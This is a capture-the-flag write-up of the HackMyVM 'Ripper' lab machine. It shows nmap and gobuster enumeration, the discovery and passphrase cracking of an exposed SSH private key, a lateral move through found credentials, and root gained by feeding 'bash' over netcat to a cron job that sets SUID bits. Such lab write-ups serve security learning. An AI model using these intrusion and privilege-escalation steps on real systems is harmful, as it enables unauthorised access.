---
layout: default
title : muzec - Ripper Writeup
---

![image](https://user-images.githubusercontent.com/69868171/121029569-b1eb7a80-c776-11eb-9ca4-3a19dbe2adaa.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/ripper]
└─$ nmap -sC -sV -oA nmap 172.16.139.201                                                                                                                         255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 06:57 EDT
Nmap scan report for 172.16.139.201
Host is up (0.00026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0c:3f:13:54:6e:6e:e6:56:d2:91:eb:ad:95:36:c6:8d (RSA)
|   256 9b:e6:8e:14:39:7a:17:a3:80:88:cd:77:2e:c3:3b:1a (ECDSA)
|_  256 85:5a:05:2a:4b:c0:b2:36:ea:8a:e2:8a:b2:ef:bc:df (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
```

We have two open ports let start our enumeration on port 80 HTTP seems it running Apache web server.

![image](https://user-images.githubusercontent.com/69868171/121029569-b1eb7a80-c776-11eb-9ca4-3a19dbe2adaa.png)

But nothing out of the ordinary stand out checking source found nothing that lead us to try and find some hidden directory with gobuster.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/ripper]
└─$ gobuster dir -u http://172.16.139.201/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak
===============================================================
```

We wait for it checking if we have any hidden directory.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/ripper]
└─$ gobuster dir -u http://172.16.139.201/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,bak
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.139.201/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,bak,txt
[+] Timeout:                 10s
===============================================================
2021/06/07 07:01:59 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 57]
/server-status        (Status: 403) [Size: 279]
/staff_statements.txt (Status: 200) [Size: 107]
                                               
===============================================================
2021/06/07 07:06:04 Finished
===============================================================
```

Seems we have one `/staff_statements.txt` let check to confirm it.

![image](https://user-images.githubusercontent.com/69868171/121031233-2b379d00-c778-11eb-9b96-88eddac07ef5.png)

`The site is not yet repaired. Technicians are working on it by connecting with old ssh connection files. ` nice some `bak` file maybe a private SSH key is active let try directory brute forcing again.


```
┌──(muzec㉿Muzec-Security)-[~/Documents/HackMyVm/ripper]                                                                                                               
└─$ gobuster dir -u http://172.16.139.201/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,bak                                                                 
===============================================================                                                                                                        
Gobuster v3.1.0                                                                                                                                                        
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                          
===============================================================                                                                                                        
[+] Url:                     http://172.16.139.201/                                                                                                                    
[+] Method:                  GET                                                   
[+] Threads:                 10                                                    
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt                  
[+] Negative Status codes:   404                                                                                                                                       
[+] User Agent:              gobuster/3.1.0                                                                                                                            
[+] Extensions:              txt,php,html,bak                                      
[+] Timeout:                 10s                                                                                                                                       
===============================================================                    
2021/06/07 07:08:55 Starting gobuster in directory enumeration mode                
===============================================================                                                                                                        
/.hta.bak             (Status: 403) [Size: 279]                                    
/.hta                 (Status: 403) [Size: 279]                                                                                                                        
/.hta.txt             (Status: 403) [Size: 279]                                                                                                                        
/.hta.php             (Status: 403) [Size: 279]                                                                                                                        
/.htaccess.php        (Status: 403) [Size: 279]                                                                                                                        
/.htpasswd.html       (Status: 403) [Size: 279]                                    
/.htaccess.html       (Status: 403) [Size: 279]                                    
/.htpasswd.bak        (Status: 403) [Size: 279]                                    
/.htaccess            (Status: 403) [Size: 279]                                                                                                                        
/.htpasswd            (Status: 403) [Size: 279]                                                                                                                        
/.htaccess.bak        (Status: 403) [Size: 279]                                                                                                                        
/.htpasswd.txt        (Status: 403) [Size: 279]                                    
/.htaccess.txt        (Status: 403) [Size: 279]                                    
/.htpasswd.php        (Status: 403) [Size: 279]                                    
/.hta.html            (Status: 403) [Size: 279]                                                                                                                        
/id_rsa.bak           (Status: 200) [Size: 1876]                                   
/index.html           (Status: 200) [Size: 57]                                     
/index.html           (Status: 200) [Size: 57]                                                                                                                         
/server-status        (Status: 403) [Size: 279]                                    
                                                                                   
===============================================================    
```

Boom a `id_rsa.bak` SSH private key cool let download it.

![image](https://user-images.githubusercontent.com/69868171/121031897-c4ff4a00-c778-11eb-9421-b9b3d0878c89.png)

I try using it to log in SSh with username `jack` but no luck seems we have to crack it i try using John the Ripper still the same issue but found some really interesting tools.

![image](https://user-images.githubusercontent.com/69868171/121032336-2f17ef00-c779-11eb-8059-bb9ed2135d95.png)

Now let try using it to crack the SSH private key `./RSAcrack.sh /usr/share/wordlists/rockyou.txt id_rsa.bak` .

![image](https://user-images.githubusercontent.com/69868171/121032966-c715d880-c779-11eb-85ef-7574e59726f0.png)

Boom now let log in with the user `jack` how do i get the `jack` username sure it from the VM.

![image](https://user-images.githubusercontent.com/69868171/121033202-f9273a80-c779-11eb-8928-9f61c745c1f8.png)

Now give the `id_rsa.bak` permission with `chmod 600 id_rsa.bak` and we should be good to go.

![image](https://user-images.githubusercontent.com/69868171/121033479-3be91280-c77a-11eb-8331-53a10e7e7d7e.png)

We are in checking the passwd file seems we have another user on the home directory but we have no access to it.

![image](https://user-images.githubusercontent.com/69868171/121033653-6044ef00-c77a-11eb-88b7-f67c05fd57a2.png)

Time to move our privilege to another user running `linpeas.sh` .

![image](https://user-images.githubusercontent.com/69868171/121035090-8a4ae100-c77b-11eb-9b12-652bad8c7614.png)

We have a credentials let try it for the user `helder` .

![image](https://user-images.githubusercontent.com/69868171/121037208-4527ae80-c77d-11eb-9541-a43747c79a50.png)

Boom we are in now let get root.

### Privilege Escalation

Checking `Sudo -l` nothing so i decided to run `pspy64` to see what we are missing.

![image](https://user-images.githubusercontent.com/69868171/121038810-93897d00-c77e-11eb-925b-cca144d3bea1.png)

nice `/bin/sh -c nc -vv -q 1 localhost 10000 > /root/.local/out && if [ "$(cat /root/.local/helder.txt)" = "$(cat /home/helder/passwd.txt)" ] ; then chmod +s "/usr/bin/$(cat /root/.local/out)" ; fi` 

Checking for a passwd file in the home directory of helder now try to abuse it let create the file first `echo "Il0V3lipt0n1c3t3a" > /home/helder/passwd.txt` .

![image](https://user-images.githubusercontent.com/69868171/121040814-342c6c80-c780-11eb-9367-8135f4ccde0c.png)

```
echo "bash" > /tmp/root
nc -lnvp 10000 < /tmp/root
ls -la /usr/bin/bash
```

Now let run the bash with -p to get root.

![image](https://user-images.githubusercontent.com/69868171/121041087-6f2ea000-c780-11eb-9575-673bfd6d64c3.png)

Root and done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
